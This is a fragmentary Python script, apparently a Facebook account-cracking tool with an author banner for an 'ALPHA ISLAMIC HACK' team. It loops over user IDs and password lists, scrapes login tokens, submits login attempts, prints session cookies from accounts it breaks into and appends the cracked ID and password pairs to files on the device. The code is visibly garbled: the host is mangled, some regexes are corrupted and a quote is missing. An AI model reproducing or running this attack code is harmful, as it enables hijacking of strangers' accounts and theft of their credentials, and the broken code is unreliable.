...
#use with cradit❤
#SAT BASIR KARIMI
#Contract FACEBOOK : 100064709298423
...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo = ("""\033[1;37m
888888       88888888     88888       8888    888888
88     88    88    88   88     88      88      88    88
88       88  88    88 88         88    88      88     88
88     88    88    88   88             88      88    88
888888       88888888    8888888       88     888888
88      88   88    88           88     88      88   88
88       88  88    88  88         88   88      88    88
88     88    88    88    88     88     88      88     88
888888       88    88      88888      8888  8888     8888
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : BASIR KARIMI    │
    │ [✓] GITHUB   : BASIR 44        │
    │ [✓] TAEM     : ALPHA ISLAMIC HACK 
    └───────────────────────────────────────┘""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.flush()
            free_fb = session.get('https://BASIR.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="BASIR" KARIMI="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" KARIMI="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" KARIMI="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": https://BASIR.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" \n Cookie : {coki}")
                open('/sdcard/BASIR/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/BASIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
